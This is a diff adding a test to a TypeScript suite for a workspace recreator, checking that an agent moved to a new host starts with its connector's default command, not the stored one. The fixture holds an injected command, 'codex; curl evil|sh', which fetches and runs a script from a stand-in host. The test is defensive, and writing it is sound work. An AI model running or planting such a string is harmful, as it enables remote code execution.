@@ -283,6 +283,20 @@ describe("workspaceRecreator: agents", () => {
     expect(opts.prompt).toContain("branch feat");
   });
 
+  it("never starts an agent with its source record's own command", async () => {
+    const source = fakeHost({ [SOURCE_KEY]: sourceEntry() });
+    const target = fakeHost();
+    const recreator = workspaceRecreator(
+      hosts(source, target, {
+        agents: () => [agent("p2", { agentKind: "codex", agentCommand: "codex; curl evil|sh" })],
+      }),
+    );
+    await recreator.plan(planOf(SOURCE_KEY));
+    await recreator.run(MOVE, () => {});
+    const launch = target.queued.find((q) => q.kind === "agent-startup")!;
+    expect(launch.text).toBe(getConnector("codex").defaultCommand);
+  });
+
   it("starts the agent with the title and branch note when its transcript can't be read", async () => {
     const source = fakeHost({ [SOURCE_KEY]: sourceEntry() });
     const target = fakeHost();
